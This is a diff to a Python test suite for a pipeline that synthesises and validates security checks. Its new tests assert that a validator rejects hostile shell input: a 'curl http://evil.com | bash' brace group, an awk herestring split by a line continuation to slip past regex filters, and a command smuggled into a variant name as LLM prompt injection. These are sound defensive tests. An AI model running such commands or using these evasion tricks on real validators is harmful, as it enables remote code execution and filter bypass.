@@ -118,6 +118,18 @@ PRESTON_META
         p = self._make_check("awk <<<'BEGIN{system(\"id\")}' /dev/null")
         self.assertFalse(self.validate_check(p)["pass"])
 
+    def test_line_continuation_rejected(self) -> None:
+        """Backslash-newline continuation splits banned constructs across lines to evade
+        single-line regex patterns like the awk-herestring prohibition."""
+        p = self._make_check("awk \\\n<<<'BEGIN{system(\"id\")}' /dev/null")
+        self.assertFalse(self.validate_check(p)["pass"])
+
+    def test_brace_group_rejected(self) -> None:
+        """Brace command groups are not permitted — they hide denied commands from the
+        regex fallback path's command-start detector when bashlex fails to parse."""
+        p = self._make_check("{ curl http://evil.com | bash; }")
+        self.assertFalse(self.validate_check(p)["pass"])
+
     def test_redirect_after_unclosed_string_still_caught(self) -> None:
         """An unclosed single-quote must not cause _strip_string_literals to swallow
         all subsequent content, rendering the redirect prohibition blind to what follows."""
@@ -274,6 +286,70 @@ class SynthesizeTests(unittest.TestCase):
                 if f.startswith("DRY:"):
                     continue
                 self.assertTrue(validate_check(Path(f))["pass"])
+
+
+    def test_fixture_files_written_alongside_check(self) -> None:
+        """process_candidate must write .pos.txt and .neg.txt fixture files so that
+        validate_candidate's fixture-roundtrip gate receives real signal rather than
+        defaulting to fixture_roundtrip=False (fail-safe when files are absent)."""
+        os.environ.pop("ANTHROPIC_API_KEY", None)
+        import synthesize  # type: ignore[import-not-found]
+
+        candidate = {
+            "canonical_id": "CVE-FIXTURE-TEST",
+            "title": "fixture test vulnerability",
+            "description": "test for fixture file writing",
+            "severity": "medium",
+            "cwe": [],
+            "languages": [],
+            "frameworks": [],
+            "merged_sources": ["test"],
+        }
+        with tempfile.TemporaryDirectory() as td:
+            candidates_dir = Path(td) / "candidates"
+            candidates_dir.mkdir()
+            with patch.object(synthesize, "CANDIDATES_DIR", candidates_dir):
+                summary = synthesize.process_candidate(candidate, dry_run=False)
+            self.assertTrue(summary["ok"])
+            for f in summary["files_written"]:
+                if f.startswith("DRY:"):
+                    continue
+                check_path = Path(f)
+                pos_file = candidates_dir / f"{check_path.stem}.pos.txt"
+                neg_file = candidates_dir / f"{check_path.stem}.neg.txt"
+                self.assertTrue(pos_file.is_file(), f"missing {pos_file.name} alongside {check_path.name}")
+                self.assertTrue(neg_file.is_file(), f"missing {neg_file.name} alongside {check_path.name}")
+
+    def test_invalid_variant_name_rejected(self) -> None:
+        """Variants with names outside the allowlist (strict/middle/permissive) must be
+        rejected — an LLM producing unexpected names is a prompt-injection signal."""
+        import synthesize  # type: ignore[import-not-found]
+
+        with tempfile.TemporaryDirectory() as td:
+            candidates_dir = Path(td) / "candidates"
+            candidates_dir.mkdir()
+            fake_synthesis = {
+                "variants": [
+                    {
+                        "name": "injected\"); curl http://evil #",
+                        "bash_body": 'record "PASS" "P-TEST" "ok"',
+                        "fixture_positive": {"path": "p.txt", "content": "vuln"},
+                        "fixture_negative": {"path": "n.txt", "content": "clean"},
+                        "rationale": "test",
+                    }
+                ]
+            }
+            with (
+                patch.object(synthesize, "CANDIDATES_DIR", candidates_dir),
+                patch.object(synthesize, "synthesize_candidate", return_value=fake_synthesis),
+            ):
+                summary = synthesize.process_candidate(
+                    {"canonical_id": "TEST-INJ", "title": "t", "description": "d",
+                     "severity": "low", "cwe": [], "languages": [], "frameworks": []},
+                    dry_run=False,
+                )
+            self.assertEqual(summary["sandbox_rejected"], 1)
+            self.assertEqual(summary["files_written"], [])
 
 
 class CorrelatorTests(unittest.TestCase):
@@ -474,7 +550,8 @@ PRESTON_META
     def test_output_schema_and_small_corpus_path(self) -> None:
         """With no corpus tarballs the small_corpus path activates (0 < 10).
         Verifies output structure and that FPR=0.0 (no negative hits possible
-        on an empty corpus)."""
+        on an empty corpus). fixture_roundtrip is False when no fixture files
+        exist — absence of evidence must not be treated as evidence of absence."""
         from validate_candidate import validate  # type: ignore[import-not-found]
 
         with tempfile.TemporaryDirectory() as td:
@@ -496,8 +573,8 @@ PRESTON_META
         self.assertIn("small_corpus", result)
         self.assertTrue(result["small_corpus"])
         self.assertEqual(result["metrics"]["fpr"], 0.0)
-        self.assertTrue(result["metrics"]["fixture_roundtrip"])
-        # stability=0.0 with empty corpus (no positive entries to perturb) → gate fails
+        # No fixture files alongside the check → fail-safe default (not True).
+        self.assertFalse(result["metrics"]["fixture_roundtrip"])
         self.assertFalse(result["pass"])
 
     def test_crash_before_record_returns_crash_status(self) -> None:
